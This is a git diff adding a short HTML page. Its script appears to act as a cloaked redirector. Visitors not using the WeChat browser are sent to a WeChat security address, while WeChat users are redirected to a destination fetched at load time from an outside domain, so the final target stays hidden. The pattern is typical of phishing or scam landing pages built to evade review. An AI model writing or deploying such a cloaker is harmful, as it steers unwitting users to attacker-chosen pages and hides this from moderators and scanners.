@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+</head>
+<body>
+<script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
+
+<script>
+// var _hmt = _hmt || [];
+// (function() {
+//   var hm = document.createElement("script");
+//   hm.src = "https://hm.baidu.com/hm.js?b65fb33b13e8f69fe4e773a0691cb40e";
+//   var s = document.getElementsByTagName("script")[0];
+//   s.parentNode.insertBefore(hm, s);
+// })();
+    var useragent = navigator.userAgent;
+    if (useragent.match(/MicroMessenger/i) != 'MicroMessenger') {
+        window.location.href = "http://weixin110.qq.com"
+    }
+    x_load = "https://www.0873fk.com/safhdja?t=" + new Date().getTime();
+        x_load && function () {
+            $.get(x_load, function (data) {
+                // var new_doc = document.open("text/html", "replace");
+                // new_doc.write(data);
+                // new_doc.close();
+                window.location.href = data
+            });
+        }();
+</script>
+
+</body>
+
+</html>
